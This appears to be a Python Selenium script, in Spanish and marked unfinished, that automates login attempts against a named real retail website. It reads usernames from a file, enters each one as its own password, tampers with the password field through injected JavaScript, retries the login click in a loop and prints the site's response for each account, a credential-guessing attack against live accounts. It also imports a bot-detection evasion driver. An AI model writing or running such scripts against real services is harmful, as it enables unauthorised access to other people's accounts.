from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException, ElementNotInteractableException
import time, os, argparse, undetected_chromedriver as uc, requests, threading, random, base64, sys

import pandas

#driver = webdriver.Chrome(executable_path="./chromedriver.exe")
url = "https://cloudintercorpretail.pe/iniciar-sesion"

#Paths
path_Usuario ='//*[@id="username"]'
path_contrasenia= '/html/body/app-root/mat-sidenav-container/mat-sidenav-content/app-login/div/div[1]/mat-card/mat-card-content/form/div[2]/mat-form-field/div/div[1]/div[1]/input'
#id_contrasenia = 'txtPass'
path_ventanaError= '/html/body/div[2]/div/div/snack-bar-container'

path_IniciarSesion = '/html/body/app-root/mat-sidenav-container/mat-sidenav-content/app-login/div/div[1]/mat-card/mat-card-footer/button'

vacio = "0"

#Abriendo el navegador
options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(options=options)

driver.get(url)
system("cls")

arhivo_lote = open("archivo2.txt","r")
textoUser = arhivo_lote.readlines()
arhivo_lote.close()

#input("Enter para comenzar")
#time.sleep(1.5)


with open ('./archivo2.txt') as texto:
	for x in texto:

		
		wait0 = WebDriverWait(driver,10)
		wait0.until(EC.visibility_of_element_located((By.XPATH,path_IniciarSesion)))
	
		
		#print(wait0)
		user = x.rstrip()
		p = "pipipipipippiippipipipipipipip¿ipippip¿p"

		wait0.until(EC.visibility_of_element_located((By.XPATH,path_Usuario)))
		#WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, path_Usuario)))
		#driver.execute_script(f'document.getElementById("username").value={user};')

		#driver.execute_script(f'document.getElementById("password").type={vacio};')
		#driver.execute_script(f'document.getElementById("password").value = "{user}";')
		
		#driver.execute_script(f'document.getElementById("submit").removeAttribute("disabled");')
		#driver.execute_script(f'document.getElementById("submit").click();')
		#driver.find_element(By.XPATH,path_Usuario).clear()
		#driver.find_element(By.XPATH,path_Usuario).send_keys(x.rstrip()) # Poniendo el usuario
		
		driver.find_element(By.XPATH,path_Usuario).clear()
		driver.find_element(By.XPATH,path_Usuario).send_keys(user) # Poniendo el usuario

		driver.find_element(By.XPATH,path_contrasenia).clear()
		driver.execute_script(f'document.getElementById("password").type={vacio};')
		driver.find_element(By.XPATH,path_contrasenia).send_keys(user) # Poniendo el usuario
		
			
		while(True):
			try:
				driver.find_element(By.XPATH ,path_IniciarSesion).click()  #Click en ingresar
				wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError))) #esperando ventana roja
				p = driver.find_element(By.XPATH,path_ventanaError).text
				break
			except Exception as e:
				print("f")

		print(p)
		print(user)
		


		print("----------------------------------------------------------------------------")
		#time.sleep(1.8)
		

print("Fin Del Programa!!!")
arhivo_lote.close()

driver.close()
# No acabado

